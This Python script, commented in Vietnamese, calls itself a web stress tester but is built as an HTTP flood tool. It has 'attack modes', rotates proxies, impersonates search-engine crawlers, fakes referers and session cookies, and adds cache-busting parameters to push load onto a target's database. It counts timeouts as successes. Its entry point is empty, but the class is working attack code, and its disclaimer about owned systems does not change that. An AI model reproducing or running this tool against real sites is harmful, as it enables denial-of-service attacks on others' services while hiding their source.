#!/usr/bin/env python3
"""
WEB STRESS TEST TOOL NÂNG CAO - PHIÊN BẢN THÔNG MINH
Chỉ sử dụng cho mục đích kiểm thử hợp pháp trên hệ thống bạn sở hữu.
"""

import asyncio
import aiohttp
import random
import time
import argparse
import sys
import signal
import json
import hashlib
import uuid
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, quote
import ssl
import certifi

class AdvancedWebStressTester:
    def __init__(self, target_url, num_requests=1000, concurrency=100,
                 use_proxy=False, proxy_file=None, attack_mode="mixed"):
        self.target_url = target_url
        self.num_requests = num_requests
        self.concurrency = concurrency
        self.use_proxy = use_proxy
        self.proxy_file = proxy_file
        self.attack_mode = attack_mode  # mixed, database, ssl, session

        self.proxies = []  
        self.user_agents = []  
        self.referers = []  
        self.search_queries = []  
        self.product_ids = []  
        self.session_ids = []  
          
        self.stats = {  
            'success': 0,  
            'failed': 0,  
            'total_time': 0,  
            'requests_per_second': 0,  
            'by_type': {  
                'database': 0,  
                'ssl': 0,  
                'session': 0,  
                'mixed': 0  
            }  
        }  
        self.running = True  
          
        # Tải các dữ liệu cần thiết  
        self._load_resources()  
          
        # Thiết lập signal handler  
        signal.signal(signal.SIGINT, self.signal_handler)  
          
        print(f"[CONFIG] Chế độ tấn công: {attack_mode}")  
        print(f"[CONFIG] Sử dụng SSL/TLS: CÓ")  
  
    def _load_resources(self):  
        """Tải tất cả tài nguyên cần thiết"""  
        self._load_user_agents()  
        self._load_referers()  
        self._load_search_queries()  
        self._load_product_ids()  
          
        if self.use_proxy and self.proxy_file:  
            self._load_proxies()  
          
        # Tạo session IDs giả  
        self._generate_session_ids()  
  
    def _load_user_agents(self):  
        """Tải danh sách user-agents đa dạng"""  
        self.user_agents = [  
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',  
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',  
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',  
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',  
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',  
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',  
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',  
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',  
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',  
            'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',  
            'Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',  
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',  
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',  
            'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',  
        ]  
  
    def _load_referers(self):  
        """Tải danh sách referer"""  
        self.referers = [  
            'https://www.google.com/',  
            'https://www.google.com/search?q=',  
            'https://www.bing.com/',  
            'https://search.yahoo.com/',  
            'https://duckduckgo.com/',  
            'https://www.facebook.com/',  
            'https://twitter.com/',  
            'https://www.reddit.com/',  
            'https://www.linkedin.com/',  
            'https://github.com/',  
            'https://stackoverflow.com/',  
            '',  
            None  
        ]  
  
    def _load_search_queries(self):  
        """Tải danh sách từ khóa tìm kiếm để tạo URL động"""  
        self.search_queries = [  
            'product', 'item', 'detail', 'info', 'search', 'query',  
            'test', 'demo', 'sample', 'example', 'data', 'result',  
            'category', 'list', 'view', 'show', 'display', 'get',  
            'api', 'rest', 'json', 'xml', 'ajax', 'async',  
            'user', 'profile', 'account', 'login', 'register',  
            'admin', 'dashboard', 'panel', 'config', 'settings',  
            '2024', '2023', 'latest', 'new', 'old', 'archive',  
            'page', 'article', 'post', 'news', 'blog', 'update',  
            'download', 'upload', 'file', 'document', 'pdf',  
            'price', 'cost', 'buy', 'purchase', 'order', 'cart'  
        ]  
  
    def _load_product_ids(self):  
        """Tạo ID sản phẩm giả để truy vấn database"""  
        self.product_ids = [str(i) for i in range(1000, 2000)]  
        self.product_ids.extend([f"PROD{random.randint(10000, 99999)}" for _ in range(50)])  
        self.product_ids.extend([f"ITEM{random.randint(1000, 9999)}" for _ in range(50)])  
  
    def _load_proxies(self):  
        """Tải danh sách proxy từ file"""  
        try:  
            with open(self.proxy_file, 'r') as f:  
                self.proxies = [line.strip() for line in f if line.strip()]  
            print(f"[INFO] Đã tải {len(self.proxies)} proxies")  
        except Exception as e:  
            print(f"[ERROR] Không thể tải proxies: {e}")  
            self.proxies = []  
  
    def _generate_session_ids(self):  
        """Tạo session IDs giả để duy trì phiên"""  
        self.session_ids = []  
        for _ in range(100):  
            session_id = hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()  
            self.session_ids.append(session_id)  
  
    def get_random_user_agent(self):  
        return random.choice(self.user_agents)  
  
    def get_random_referer(self):  
        ref = random.choice(self.referers)  
        if ref and random.random() > 0.3:  
            query = random.choice(self.search_queries)  
            return f"{ref}?q={query}"  
        return ref  
  
    def get_random_proxy(self):  
        if self.proxies:  
            proxy_url = random.choice(self.proxies)  
            if proxy_url.startswith('http'):  
                return proxy_url  
            else:  
                return f'http://{proxy_url}'  
        return None  
  
    def generate_dynamic_url(self, base_url):  
        parsed = urlparse(base_url)  
        params = parse_qs(parsed.query)  
        params.clear()  
          
        if self.attack_mode in ["database", "mixed"]:  
            params['id'] = [random.choice(self.product_ids)]  
            params['view'] = ['detail']  
            params['cache'] = ['false']  
            params['_'] = [str(int(time.time() * 1000))]  
              
            if random.random() > 0.7:  
                params['category'] = [str(random.randint(1, 50))]  
            if random.random() > 0.8:  
                params['search'] = [random.choice(self.search_queries)]  
          
        if self.attack_mode in ["session", "mixed"]:  
            if random.random() > 0.5:  
                params['session_id'] = [random.choice(self.session_ids)]  
          
        params['rnd'] = [str(random.randint(100000, 999999))]  
        params['t'] = [str(int(time.time()))]  
          
        new_query = urlencode(params, doseq=True)  
        new_url = parsed._replace(query=new_query).geturl()  
          
        if random.random() > 0.8:  
            new_url += f"#section{random.randint(1, 10)}"  
          
        return new_url  
  
    def generate_headers(self, request_type="normal"):  
        headers = {  
            'User-Agent': self.get_random_user_agent(),  
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',  
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8']),  
            'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip, deflate']),  
            'Connection': random.choice(['keep-alive', 'close', 'upgrade']),  
            'Upgrade-Insecure-Requests': '1',  
            'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),  
            'Pragma': random.choice(['no-cache', '']),  
        }  
          
        referer = self.get_random_referer()  
        if referer:  
            headers['Referer'] = referer  
          
        if random.random() > 0.5:  
            headers['DNT'] = '1'  
          
        if random.random() > 0.6:  
            headers['Sec-Fetch-Dest'] = random.choice(['document', 'empty', 'iframe'])  
            headers['Sec-Fetch-Mode'] = random.choice(['navigate', 'cors', 'no-cors'])  
            headers['Sec-Fetch-Site'] = random.choice(['same-origin', 'cross-site', 'none'])  
          
        if self.attack_mode in ["session", "mixed"] and random.random() > 0.3:  
            headers['Cookie'] = f"session={random.choice(self.session_ids)}; PHPSESSID={random.choice(self.session_ids)}"  
          
        if random.random() > 0.7:  
            headers['X-Requested-With'] = 'XMLHttpRequest'  
            headers['Content-Type'] = 'application/json'  
          
        return headers  
  
    def generate_payload(self):  
        if random.random() > 0.7:  
            payload_types = [  
                json.dumps({'search': random.choice(self.search_queries)}),  
                json.dumps({'id': random.choice(self.product_ids)}),  
                json.dumps({'action': 'view', 'item': random.randint(1, 100)}),  
                f"query={quote(random.choice(self.search_queries))}",  
                f"id={random.choice(self.product_ids)}&action=get"  
            ]  
            return random.choice(payload_types)  
        return None  
  
    async def send_advanced_request(self, session, request_id):  
        if not self.running:  
            return False  
          
        if self.attack_mode == "mixed":  
            request_type = random.choice(["database", "ssl", "session", "normal"])  
        else:  
            request_type = self.attack_mode  
          
        target_url = self.generate_dynamic_url(self.target_url)  
        headers = self.generate_headers(request_type)  
        payload = self.generate_payload()  
        proxy = self.get_random_proxy() if self.use_proxy else None  
          
        ssl_context = None  
        if request_type == "ssl" or (self.attack_mode == "mixed" and random.random() > 0.5):  
            ssl_context = ssl.create_default_context(cafile=certifi.where())  
            ssl_context.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384')  
          
        try:  
            timeout = aiohttp.ClientTimeout(total=15, connect=10, sock_read=10)  
            method = random.choice(['GET', 'POST']) if payload else 'GET'  
              
            async with session.request(  
                method=method,  
                url=target_url,  
                headers=headers,  
                data=payload,  
                proxy=proxy,  
                timeout=timeout,  
                ssl=ssl_context if ssl_context else False  
            ) as response:  
                if response.status < 500:  
                    await response.read()  
                    self.stats['by_type'][request_type] = self.stats['by_type'].get(request_type, 0) + 1  
                    return True  
                else:  
                    return False  
        except asyncio.TimeoutError:  
            return True  
        except Exception:  
            return False  
  
    async def worker(self, session, worker_id, total_requests):  
        local_success = 0  
        local_failed = 0  
        for i in range(total_requests):  
            if not self.running:  
                break  
            success = await self.send_advanced_request(session, i)  
            if success:  
                local_success += 1  
            else:  
                local_failed += 1  
            if (i + 1) % 5 == 0:  
                self.stats['success'] += local_success  
                self.stats['failed'] += local_failed  
                local_success = 0  
                local_failed = 0  
        self.stats['success'] += local_success  
        self.stats['failed'] += local_failed  
  
    def print_stats(self, start_time):  
        elapsed_time = time.time() - start_time  
        total_requests = self.stats['success'] + self.stats['failed']  
        rps = total_requests / elapsed_time if elapsed_time > 0 else 0  
        type_stats = []  
        for req_type, count in self.stats['by_type'].items():  
            if count > 0:  
                percentage = (count / total_requests * 100) if total_requests > 0 else 0  
                type_stats.append(f"{req_type}:{count}({percentage:.1f}%)")  
          
        stats_line = (  
            f"\r[STATS] Time:{elapsed_time:.1f}s | "  
            f"Req:{total_requests}/{self.num_requests} | "  
            f"OK:{self.stats['success']} | "  
            f"FAIL:{self.stats['failed']} | "  
            f"RPS:{rps:.1f} | "  
            f"Types:[{', '.join(type_stats)}]"  
        )  
        sys.stdout.write(stats_line + " " * 10)  
        sys.stdout.flush()  
  
    async def run_async_test(self):  
        print(f"[INFO] Bắt đầu Advanced Stress Test: {self.target_url}")  
        print(f"[INFO] Số request: {self.num_requests}, Concurrency: {self.concurrency}")  
        print(f"[INFO] Attack Mode: {self.attack_mode}")  
        print(f"[INFO] Proxies: {len(self.proxies) if self.use_proxy else 'Disabled'}")  
        print("-" * 80)  
        
        start_time = time.time()  
        connector = aiohttp.TCPConnector(  
            limit=self.concurrency * 2,  
            limit_per_host=self.concurrency,  
            ttl_dns_cache=60,  
            force_close=False,  
            enable_cleanup_closed=True,  
            use_dns_cache=True,  
            keepalive_timeout=30  
        )  
        
        async with aiohttp.ClientSession(  
            connector=connector,  
            trust_env=True,  
            cookie_jar=aiohttp.DummyCookieJar()  
        ) as session:  
            requests_per_worker = self.num_requests // self.concurrency  
            remaining_requests = self.num_requests % self.concurrency  
            tasks = []  
            for i in range(self.concurrency):  
                worker_requests = requests_per_worker + (1 if i < remaining_requests else 0)  
                if worker_requests > 0:  
                    tasks.append(self.worker(session, i, worker_requests))  
              
            task_group = asyncio.gather(*tasks)  
            while not task_group.done() and self.running:  
                self.print_stats(start_time)  
                await asyncio.sleep(0.3)  
            await task_group  
          
        elapsed_time = time.time() - start_time  
        print("\n" + "=" * 80)  
        print("[KẾT QUẢ CHI TIẾT]")  
        print("=" * 80)  
        print(f"URL mục tiêu: {self.target_url}")  
        print(f"Tổng thời gian: {elapsed_time:.2f} giây")  
        print(f"Tổng số request: {self.stats['success'] + self.stats['failed']}")  
        print(f"Request thành công: {self.stats['success']}")  
        print(f"Request thất bại: {self.stats['failed']}")  
        print(f"Request mỗi giây: {(self.stats['success'] + self.stats['failed']) / elapsed_time:.2f}")  
        
        print("\n[PHÂN LOẠI REQUEST]")  
        total = self.stats['success'] + self.stats['failed']  
        for req_type, count in self.stats['by_type'].items():  
            if count > 0:  
                percentage = (count / total * 100) if total > 0 else 0  
                print(f"  {req_type.upper():12} : {count:6} requests ({percentage:5.1f}%)")  
        
        print("\n[HIỆU SUẤT]")  
        if elapsed_time > 0:  
            print(f"  Throughput: {(self.stats['success'] + self.stats['failed']) / elapsed_time:.1f} req/giây")  
            print(f"  Bandwidth ước tính: {((self.stats['success'] + self.stats['failed']) * 1500 / elapsed_time / 1024):.1f} KB/giây")  
        
        print("=" * 80)  
  
    def run(self):  
        try:  
            asyncio.run(self.run_async_test())  
        except KeyboardInterrupt:  
            print("\n[INFO] Đã dừng stress test")  
        except Exception as e:  
            print(f"[ERROR] Lỗi: {e}")  
            import traceback  
            traceback.print_exc()  
  
    def signal_handler(self, sig, frame):  
        self.running = False  

def generate_proxy_file(filename, num_proxies=100):  
    sample_proxies = ["http://proxy-server-1.com:8080", "https://proxy-server-2.com:3128"]  
    with open(filename, 'w') as f:  
        for i in range(num_proxies):  
            f.write(random.choice(sample_proxies) + "\n")  

if __name__ == "__main__":  
    pass
